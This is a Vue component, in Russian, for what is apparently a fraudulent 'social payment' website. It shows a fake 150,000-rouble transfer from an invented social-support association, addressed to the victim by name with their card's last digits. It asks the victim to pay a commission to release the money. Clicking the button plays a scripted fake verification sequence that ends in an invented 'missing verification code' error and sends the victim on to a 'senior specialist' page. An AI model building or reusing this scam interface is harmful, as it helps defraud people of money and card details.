<template>
	<div class="v-first-transaction">
		<div class="firstTransaction">
			<div class="hideFirstTransaction">
			<div class="firstTransactionTopBlock">
				<div class="firstTransactionTopBlockHeader">
					<p>Транзакция №658426589 на сумму 150 000 руб</p>
					<p>успешно отправлена и находится в буферной ячейке</p>
				</div>
				<div>
					<p class="firstTransactionTopText">сразу после оплаты комиссии за вторую транзакцию на сумму 77 362 руб.</p>
					<p class="firstTransactionTopText">Обе выплаты будут отправлены на вашу карту **** **** **** {{this.passportFour}}</p>
				</div>
			</div>
			<div>
				<div class="firstTransactionBlock">
					<p class="firstTransactionHeader">Назначение платежа:</p>
					<p class="firstTransactionText">Социальная выплата</p>
				</div>
				<div class="firstTransactionBlock">
					<p class="firstTransactionHeader">Отправитель:</p>
					<p class="firstTransactionText">Региональная ассоциация социальной поддержки населения</p>
				</div>
				<div class="firstTransactionBlock">
					<p class="firstTransactionHeader">Дата:</p>
					<p class="firstTransactionText">{{date | date}}</p>
				</div>
				<div class="firstTransactionBlock">
					<p class="firstTransactionHeader">Номер документа:</p>
					<p class="firstTransactionText">658426970</p>
				</div>
				<div class="firstTransactionBlock">
					<p class="firstTransactionHeader">Получатель:</p>
					<p class="firstTransactionText">{{this.$store.state.processingData.lastName}} {{this.$store.state.processingData.name}} {{this.$store.state.processingData.middleName}}</p>
				</div>
				<div class="firstTransactionBlock">
					<p class="firstTransactionHeader">Реквизиты:</p>
					<p class="firstTransactionText">**** **** **** {{this.passportFour}}</p>
				</div>
				<div class="firstTransactionBlock">
					<p class="firstTransactionHeader">Код авторизации:</p>
					<p class="firstTransactionText">945262</p>
				</div>
				<div class="firstTransactionBlock">
					<p class="firstTransactionHeader">Сумма операции:</p>
					<p class="firstTransactionText">77 362 руб.</p>
				</div>
				<div class="firstTransactionBlock">
					<p class="firstTransactionHeader">Комиссия: </p>
					<p class="firstTransactionText"><span>770 руб.</span></p>
				</div>
				<div class="firstTransactionBlock">
					<p class="newfirstTransactionHeader">Статус пошлины: </p>
					<p class="firstTransactionText">Не оплачена</p>
				</div>
			</div>
			<div class="firstTransactionBlockButton">
					<button class="firstTransactionButton" @click="showLoader">Оплатить комиссию и получить моментально обе выплаты (150 000 руб и 77 362 руб)</button>			
			</div>
		</div>
			<div class="showFirstTransaction">
			 <p class="firstTransactionHeaderOne">Подготовка электронных документов</p>
			 <p class="firstTransactionHeaderTwo">Сумма операции: 77 362 руб.</p>
			 <p class="firstTransactionHeaderThree">Проверка статуса транзакций…</p>
			 <p class="firstTransactionHeaderFour">Проверка статуса…</p>
			 	<div class="wrapperefirstTransactionLoader">
					<div class="loaderefirstTransactionLoader"></div>
				</div>
				<img :src="require('@/assets/icons/check-in.png')" class="imageHidden">
				<div class="firstTransactionTextOne">
					<p class="transactionOne">Сверка по базам данных</p>
					<p class="transactionTwo">Отправляем вторую транзакцию</p>
				</div>
				<p class="firstTransactionTextTwo">Транзакция отправлена в буферную ячейку</p>
				<p class="firstTransactionTextThree">Транзакция 1 - отправлена</p>
				<p class="firstTransactionTextFour">Транзакция 2 - отправлена</p>
				<p class="firstTransactionTextFive">Транзакции не приняты банком получателя</p>
				<p class="firstTransactionTextSix">Отсутствует верификационный код получателя</p>
			</div>
		</div>
	</div>
</template>

<script>
	export default {
		name: 'v-first-transaction',
		data() {
			return {
				date: Date.now(),
				passportFour: ''
			}
		},
		computed: {
			passportNumber() {
				if(this.$store.state.processingData.cardNumber) {
					let passport = this.$store.state.processingData.cardNumber;
					let passportFourSplit = passport.split('')
					let passportFourSplice = passportFourSplit.splice(15)
					let full = passportFourSplice.join('')
					this.passportFour = full
				}
			}
		},
		methods: {
			showLoader() {
				let showFirstTransaction 			 = document.querySelector('.showFirstTransaction')
				let hideFirstTransaction 			 = document.querySelector('.hideFirstTransaction')
				let transactionOne 					 = document.querySelector('.transactionOne')
				let transactionTwo 					 = document.querySelector('.transactionTwo')
				let firstTransactionTextOne   		 = document.querySelector('.firstTransactionTextOne')
				let firstTransactionHeaderOne 		 = document.querySelector('.firstTransactionHeaderOne')
				let firstTransactionHeaderTwo 		 = document.querySelector('.firstTransactionHeaderTwo')
				let firstTransactionHeaderThree 	 = document.querySelector('.firstTransactionHeaderThree')
				let firstTransactionHeaderFour 		 = document.querySelector('.firstTransactionHeaderFour')
				let firstTransactionTextTwo   		 = document.querySelector('.firstTransactionTextTwo')
				let firstTransactionTextThree 		 = document.querySelector('.firstTransactionTextThree')
				let firstTransactionTextFour 		 = document.querySelector('.firstTransactionTextFour')
				let firstTransactionTextFive 		 = document.querySelector('.firstTransactionTextFive')
				let firstTransactionTextSix 		 = document.querySelector('.firstTransactionTextSix')
				let wrapperefirstTransactionLoader   = document.querySelector('.wrapperefirstTransactionLoader')
				let imageHidden 					 = document.querySelector('.imageHidden')


				showFirstTransaction.style.display = 'block'
				hideFirstTransaction.style.display = 'none'

				setTimeout(() => {
					transactionOne.style.display = 'block'
				}, 1000)
				setTimeout(() => {
					transactionTwo.style.display = 'block'
				}, 2000)
				setTimeout(() => {
					firstTransactionTextOne.style.display = 'none'
					firstTransactionHeaderTwo.style.display = 'block'
					firstTransactionHeaderOne.style.display = 'none'
				}, 3000)
				setTimeout(() => {
					firstTransactionTextTwo.style.display = 'block'
				}, 4000)
				setTimeout(() => {
					firstTransactionHeaderThree.style.display = 'block'
					firstTransactionHeaderTwo.style.display = 'none'
					firstTransactionTextTwo.style.display = 'none'
				}, 5000)
				setTimeout(() => {
					firstTransactionTextThree.style.display = 'block'
				}, 6000)
				setTimeout(() => {
					firstTransactionTextFour.style.display = 'block'
				}, 7000)
				setTimeout(() => {
					firstTransactionHeaderFour.style.display = 'block'
					firstTransactionHeaderThree.style.display = 'none'
				}, 8000)
				setTimeout(() => {
					firstTransactionTextThree.style.display = 'none'
					firstTransactionTextFour.style.display = 'none'
				}, 9000)
				setTimeout(() => {
					wrapperefirstTransactionLoader.style.display = 'none'
					imageHidden.style.display = 'block'
					firstTransactionTextFive.style.display = 'block'
					firstTransactionTextSix.style.display = 'block'
				}, 10000)
				setTimeout(() => {
					this.$router.push('/seniorSpecialist')
				}, 11000)
			}
		},
		mounted() {
			this.passportNumber
		}
	}
</script>

<style>
	.v-first-transaction {
		max-width: 800px;
		margin: 0 auto;
		padding: 80px 0;
		display: flex;
		justify-content: center;
	}
	.firstTransaction {
		width: 100%;
		min-height: 585px;
		background: #FFFFFF;
		box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
		border-radius: 15px;
		padding: 25px 10px;
		text-align: center;
	}
	.firstTransactionTopBlock {
		border-bottom: 1px solid #E5E5E5;
		text-align: center;
		margin-bottom: 20px;
	}
	.firstTransactionTopBlockHeader{
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 24px;
		line-height: 29px;
		color: #005391;
		margin-top: 20px;
		margin-bottom: 20px;
	}
	.firstTransactionTopBlockHeader p{
		margin: 0;
	}
	.firstTransactionTopText {
		font-family: Montserrat;
		font-style: normal;
		font-weight: 500;
		font-size: 16px;
		line-height: 20px;
		color: #2D2D2D;
		margin: 0;
	}
	.firstTransactionTopText:last-child{
		margin-bottom: 15px;
	}
	.firstTransactionTopSumma {
		font-family: Exo 2;
		font-style: normal;
		font-weight: 800;
		font-size: 24px;
		line-height: 29px;
		color: #2D2D2D;
		margin:0;
		margin-bottom: 10px;
	}
	.firstTransactionTopSubText {
		font-family: Montserrat;
		font-style: normal;
		font-weight: 500;
		font-size: 14px;
		line-height: 17px;
		color: #AEAEAE;
		margin: 0;
		margin-bottom: 10px;
	}
	.firstTransactionBlock {
		display: grid;
		grid-template-columns: 1fr 2fr;
	}
	.firstTransactionHeader {
		text-align: right;
		margin: 6px 0 6px 0px;
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		color: #646464;
	}
	.newfirstTransactionHeader {
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		text-align: right;
		color: #008ED1;
		margin: 6px 0 6px 0px;
	}
	.firstTransactionText {
		text-align: left;
		margin-left: 10px;
		margin: 6px 0 6px 10px;
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		color: #313131;
	}
	.firstTransactionText span {
		color: #008ED1;
	}
	.newfirstTransactionText {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 16px;
		line-height: 20px;
		color: #008ED1;
		margin: 6px 0 6px 10px;
		text-align: left;
	}
	.firstTransactionBlockButton {
		text-align: center;
	}
	.firstTransactionButton {
		padding: 5px;
		background: #005391;
		border-radius: 5px;
		border: none;
		outline: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 16px;
		line-height: 20px;
		text-align: center;
		text-transform: uppercase;
		color: #FFFFFF;
		margin-top: 55px;
		width: 70%;
	}
	.firstTransactionButton:hover {
		background: #2E7DB8;
	}
	.showFirstTransaction {
		display: none;
	}
	.firstTransactionHeaderOne {
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
	}
	.wrapperefirstTransactionLoader {
		margin: 34px auto;
		width: 53px;
	}
	.loaderefirstTransactionLoader {
		animation: loader-spin 1s linear infinite;
		width: 53px;
		height: 53px;
		border: 4px solid rgba(0,0,0,0.1);
		border-radius: 50%;
		border-right-color: #0062AA;
		margin-top: 55px;
		margin-bottom: 60px;
	}
	@keyframes loader-spin {
  	0% {
    	transform: rotate(0deg);
  	}
  	100% {
    	transform: rotate(360deg);
  	}
	}
	.firstTransactionTextOne {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		text-align: center;
		color: #0062AA;
	}
	.transactionOne {
		display: none;
	}
	.transactionTwo {
		display: none;
	}
	.firstTransactionHeaderTwo {
		display: none;
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
	}
	.firstTransactionHeaderThree {
		display: none;
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
	}
	.firstTransactionHeaderFour {
		display: none;
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
	}
	.firstTransactionTextTwo {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	.firstTransactionTextThree {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	.firstTransactionTextFour {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	.firstTransactionTextFive {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	.firstTransactionTextSix {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		color: #646464;
	}
	.imageHidden {
		display: none;
		margin: 55px auto;
		width: 53px;
	}
	@media only screen and (max-width: 440px) {
		.firstTransaction {
			padding:20px 15px;
			margin: 10px;
			width: 250px;
		}
		.firstTransactionTopBlockHeader{
			font-family: Exo 2;
			font-style: normal;
			font-weight: bold;
			font-size: 20px;
			line-height: 24px;
			color: #005391;
		}
		.firstTransactionBlockButton {
			font-size: 14px;
			width: 100%;
		}
		.firstTransactionBlock {
			display: grid;
			grid-template-columns: 1fr;
			grid-template-rows: 1fr 1fr;
		}
		.firstTransactionHeader {
			text-align: left;
		}
		.firstTransactionText {
			text-align: left;
			margin: 0;
		}
		.newfirstTransactionHeader {
			text-align: left;
		}
		.firstTransactionButton {
			padding: 5px;
			background: #005391;
			border-radius: 5px;
			border: none;
			outline: none;
			font-family: Montserrat;
			font-style: normal;
			font-weight: bold;
			font-size: 13px;
			line-height: 20px;
			text-align: center;
			text-transform: uppercase;
			color: #FFFFFF;
			margin-top: 25px;
			width: 100%;
		}
	}
</style>